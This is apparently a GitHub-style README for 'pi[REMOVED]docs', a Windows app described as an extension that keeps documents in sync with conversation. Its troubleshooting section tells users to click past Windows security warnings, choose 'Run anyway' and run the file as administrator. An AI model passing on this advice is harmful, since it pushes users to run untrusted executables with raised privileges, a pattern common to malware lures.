## ✨ What is pi-magic-docs?

pi-magic-docs is a Windows app that helps your documents stay current as you talk. It works as a pi extension and updates living documents from your conversation, so you can keep notes, drafts, and project pages in sync with less manual work.

Use it when you want your docs to reflect what you just said, decided, or changed. It fits well for meeting notes, personal knowledge bases, task logs, and project pages.

## 🧭 How it works

pi-magic-docs listens to your conversation flow and turns useful parts into document updates. It can help keep pages fresh without making you rewrite the same notes again.

A simple use case looks like this:

- You talk through a task or idea
- The app captures the useful parts
- It updates a document or note
- You review the result and save it

This makes it easier to keep a living document that changes as your plans change.

## 🛠️ Troubleshooting

### The file will not open

- Right-click the file and choose Open
- If Windows blocks it, choose More info, then Run anyway
- Check that the file finished downloading

### Windows says the app is unsafe

- Confirm that you downloaded it from the GitHub page
- Remove any broken download and try again
- Use the latest release if more than one file is listed

### The app opens and closes fast

- Try running it again as an administrator
- Make sure your PC meets the system needs
- Restart your computer and try again

### My documents do not update

- Check that you selected the right folder
- Make sure the file is not open in another app
- Confirm that the app has permission to edit files
- Save your work and try a smaller document first

### I cannot find the downloaded file

- Open your browser downloads list
- Look in the Downloads folder
- Search for `pi-magic-docs` in File Explorer
